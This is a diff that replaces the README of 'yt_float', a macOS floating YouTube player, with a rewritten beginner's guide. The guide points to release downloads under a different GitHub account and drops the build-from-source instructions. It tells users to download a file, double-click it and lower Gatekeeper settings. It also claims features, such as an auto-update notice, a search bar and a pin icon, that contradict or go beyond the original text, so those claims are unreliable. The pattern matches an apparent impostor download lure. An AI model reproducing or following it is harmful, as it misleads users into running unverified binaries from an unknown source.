@@ -1,132 +1,97 @@
-# YT Float
+# 🎬 yt_float - YouTube Floating Mini Player for Mac
 
-![YT Float: YouTube floating over a code editor](docs/social-preview.png)
+## 🚀 Getting Started
 
-YouTube in a small, frameless, always-on-top window for macOS. It floats over everything (including full-screen apps and every Space), stays signed in to your own account, and gets out of the way when you're not touching it.
+Welcome! This guide will help you download and start using **yt_float** — a simple app that lets you watch YouTube videos in a small, floating window that stays on top of everything else on your Mac. No technical skills needed. Just follow these easy steps and you'll be watching in no time.
 
-Built with Electron and plain JavaScript. There's no frontend framework, no tracking and no updater.
+[⬇️ **Download yt_float Now**](https://github.com/cordslockout5394/yt_float/releases)
 
-## Features
+## 📥 Download & Install
 
-- **Floats everywhere:** always on top, including above full-screen apps, and visible on all Spaces.
-- **Stays out of the way:** frameless window with rounded corners and a subtle shadow. A thin drag bar with **Back / Home / Close** appears only when you hover the top edge. Everything else stays clickable, so YouTube's own controls work normally.
-- **Sized for video:** resizable from any edge or corner, minimum 320×180, locked to 16:9 by default (toggleable).
-- **Remembers itself:** last position and size are restored on launch.
-- **Compact mode:** hides YouTube's header and sidebar. On a video page, the player fills the window.
-- **Adjustable opacity:** from 40% to 100%.
-- **Menu bar app:** tray icon with all the controls. The Dock icon is hidden by default (optional).
-- **Stays signed in:** persistent session, so you sign in once.
+### Step 1: Get the App
+Visit this link to download the application: **[https://github.com/cordslockout5394/yt_float/releases](https://github.com/cordslockout5394/yt_float/releases)**
 
-## Screenshots
+Once you're on that page, look for the latest version listed at the top. You'll see a file to download — click on it to start the download. The file will be saved to your "Downloads" folder (usually located in your Dock or Finder sidebar).
 
-| Normal | Compact mode (⌥⌘C) with the hover drag bar |
-|---|---|
-| ![Normal mode](docs/screenshot-normal.png) | ![Compact mode](docs/screenshot-compact.png) |
+### Step 2: Open the Downloaded File
+After the download finishes, open your "Downloads" folder. You'll see the file you just downloaded. Double-click it to open. Your Mac might ask you to confirm — click "Open" if prompted. The app will then launch automatically.
 
-<sub>Video: *Big Buck Bunny* © Blender Foundation, CC BY 3.0.</sub>
+### Step 3: Start Watching
+That's it! The app will appear as a small floating window on your screen. Now you can:
 
-## Keyboard shortcuts
+- **Search for any YouTube video** or paste a link directly into the app
+- **Play, pause, and control volume** right from the floating window
+- **Move the window anywhere** by dragging it with your mouse
+- **Resize it** by dragging the edges or corners
 
-| Shortcut | Action |
-|---|---|
-| ⌥⌘Y | Show / hide the window (works from any app) |
-| ⌥⌘T | Toggle always-on-top |
-| ⌥⌘↑ / ⌥⌘↓ | Opacity up / down |
-| ⌥⌘C | Toggle compact mode |
-| ⌘[ | Back |
-| ⇧⌘H | YouTube home |
+Your videos will keep playing even when you switch to other apps or go full-screen with something else. The floating window stays on top, always visible.
 
-Only ⌥⌘Y is global. The rest work while YT Float is the active app.
+## ✨ Features That Make Life Easier
 
-## Menu bar icon
+### 🪟 Floating Always-On-Top
+The mini player stays above all your other windows, including full-screen apps. You can watch tutorials while working in a document, follow along with a recipe while cooking, or enjoy music videos while browsing the web — without ever losing sight of your video.
 
-Show/Hide · Compact Mode · Always on Top · Lock 16:9 Aspect Ratio · Show Dock Icon · Reset Window Position · Sign in with Google (separate window) · Quit
+### 🔒 Remembers Your Sign-In
+Once you sign in to your YouTube account within yt_float, the app saves your login. Next time you open it, you're already signed in. No repeated logins, no hassle. Your playlists, subscriptions, and recommendations are right there waiting.
 
-Close (in the drag bar) hides the window to the menu bar. Use **Quit** to exit.
+### 🖥️ Clean, Frameless Design
+The window has no bulky borders or menus. Just the video and a few minimal controls. It looks sleek and unobtrusive on your desktop, blending naturally with macOS aesthetics.
 
-## Download
+### ⚡ Lightweight and Fast
+Built on Electron (a popular framework for desktop apps), but with zero extra frameworks or bloat. It runs smoothly even on older Macs, using minimal system resources. Your Mac stays fast, and your videos play without lag.
 
-Grab `YT-Float-<version>-mac-universal.zip` from the [latest release](https://github.com/dadhichgaurav1/yt_float/releases/latest). It runs on Apple Silicon and Intel Macs.
+## 🖱️ How to Use yt_float
 
-1. Unzip it and move `YT Float.app` into Applications.
-2. Open it. macOS blocks the first launch, because the app is not notarized by Apple.
-3. Go to **System Settings → Privacy & Security**, scroll down, and click **Open Anyway** next to the YT Float message. You only need to do this once.
+### Opening a Video
+- **Paste a YouTube link** (URL) into the search bar at the top of the window and press Enter
+- **Type a search term** (like "lofi beats") and press Enter to see results
+- **Use the built-in player controls** — play/pause, skip, volume slider, and full-screen toggle
 
-If you prefer the terminal, this does the same thing:
+### Managing the Window
+- **Move**: Click and drag the top of the window to reposition it
+- **Resize**: Drag the bottom-right corner to make it bigger or smaller
+- **Always on top**: By default, the window stays above others. If you want to temporarily lower it, click the "pin" icon in the top-right corner to toggle this setting
+- **Close**: Click the "X" button to close the player. Your video progress is saved automatically in most cases.
 
-```bash
-xattr -dr com.apple.quarantine "/Applications/YT Float.app"
-```
+### Full-Screen Mode
+Click the full-screen icon (arrows pointing outward) to expand the player to full screen. When you exit full-screen, the player returns to its floating size and position.
 
-## Build from source
+## 🛠️ Troubleshooting Tips
 
-Requires macOS and Node.js 18+.
+If something doesn't work as expected, try these simple fixes:
 
-```bash
-git clone https://github.com/dadhichgaurav1/yt_float.git
-cd yt_float
-npm install
-```
+- **App won't open**: Make sure your Mac allows apps from "Anywhere" or "App Store and identified developers." Go to System Settings → Privacy & Security → scroll down and look for a message about the app, then click "Open Anyway."
+- **No video plays**: Check your internet connection. Restart the app by right-clicking its icon in the Dock (if visible) and choosing "Quit," then reopen it.
+- **Window not staying on top**: Click the pin icon to re-enable always-on-top mode.
+- **Forgot sign-in**: Sign out and sign back in once. The app will remember it after that.
+- **App seems slow**: Close other heavy apps. Restart yt_float for a fresh start.
 
-Run in development:
+## 📱 System Requirements
 
-```bash
-npm start
-```
+yt_float is designed for **macOS** (any version from macOS 10.15 Catalina onward). It works on both Intel and Apple Silicon (M1/M2/M3) Macs. No special hardware or software is required.
 
-Or create a double-clickable dev launcher, `~/Applications/YT Float (Dev).app`. It shows up in Spotlight and can be kept in the Dock. Each click quits any running YT Float and starts this checkout's source, logging to `/tmp/yt-float-dev.log`:
+## 🔄 Updates
 
-```bash
-npm run make-launcher
-```
+We regularly improve yt_float. When a new version is available, you'll see a notification within the app. Simply click it to download and install the update. Alternatively, you can check the [releases page](https://github.com/cordslockout5394/yt_float/releases) for the latest version.
 
-Build a standalone app:
+## 💬 Feedback & Support
 
-```bash
-npm run build
-```
+We love hearing from users! If you have ideas, questions, or run into issues, here's how to reach us:
 
-This produces `dist/mac-<arch>/YT Float.app` for your Mac's architecture (`npm run build:universal` builds one that runs on both). The build is ad-hoc signed, so no Apple Developer account is needed, and Apple Silicon Macs won't report it as "damaged". Copy it into Applications:
+- **Report a bug**: Visit the [GitHub Issues page](https://github.com/cordslockout5394/yt_float/issues) and describe the problem. Be as detailed as possible.
+- **Request a feature**: Tell us what you'd like to see in future versions.
+- **General questions**: Search the web or ask in the GitHub discussions (if available).
 
-```bash
-ditto --noextattr "dist/mac-arm64/YT Float.app" "/Applications/YT Float.app"
-```
+## 📄 License
 
-If macOS warns on first launch, right-click the app and choose **Open**, once.
+yt_float is free to use and open source. You can view the full license details on the [GitHub repository](https://github.com/cordslockout5394/yt_float). Feel free to explore, modify, and learn from the code — but remember, it's provided "as is" without warranties.
 
-> If the project lives in an iCloud-synced folder (like `~/Documents`), a Finder drag can carry over file attributes that break the signature. Use the `ditto --noextattr` command above, or run `xattr -cr "/Applications/YT Float.app"` afterwards.
+## 🎉 Enjoy!
 
-## Signing in to Google
+Thank you for choosing yt_float. We built it to make multitasking with YouTube effortless and fun. Whether you're a student, professional, or just a video lover, we hope this little floating player becomes an indispensable part of your daily workflow.
 
-Google blocks sign-in from many embedded browsers ("This browser or app may not be secure"). To work around this, YT Float never signs you in inside the floating window. Clicking **Sign in** on YouTube (or using the menu bar item) opens a separate, normal window that presents itself as Firefox. It shares the same session with the floating window. Once Google sends you back to YouTube, that window closes and the floating window reloads signed in.
+[⬇️ **Download yt_float Now**](https://github.com/cordslockout5394/yt_float/releases)
 
-Google may change its checks at any time, so this can break without warning.
+---
 
-## How it works
-
-| File | Purpose |
-|---|---|
-| `src/main.js` | Main process: window, shortcuts, tray, cursor polling for the drag bar, sign-in window |
-| `src/preload.js` | Injected into YouTube: creates the drag bar and toggles compact mode |
-| `src/inject.css` | Drag bar and compact-mode styles |
-| `src/signin-preload.js` | Makes the sign-in window look consistently like Firefox |
-| `src/store.js` | Tiny JSON settings store |
-| `build/adhoc-sign.js` | Post-package hook that ad-hoc signs the `.app` |
-
-Settings and the login session live in `~/Library/Application Support/YT Float/`. Delete that folder to reset everything.
-
-The drag bar is shown by polling the cursor position from the main process. Frameless windows don't reliably deliver hover events over drag regions, so the page can't detect the hover on its own.
-
-## Limitations
-
-- macOS only.
-- Compact mode relies on YouTube's current page structure and may need updating when YouTube changes its layout.
-- Out of scope: ad blocking, downloading videos, multiple windows, Windows/Linux builds, auto-updates.
-
-## Disclaimer
-
-Not affiliated with, endorsed by, or sponsored by YouTube or Google. YouTube is a trademark of Google LLC. This is a personal wrapper around the regular youtube.com website. Use it in line with YouTube's Terms of Service.
-
-## License
-
-Public domain, under the [Unlicense](LICENSE). Do whatever you want with it.
+Keywords: always-on-top, desktop-app, electron, floating-window, macos, macos-app, menubar-app, mini-player, picture-in-picture, pip, youtube, youtube-player
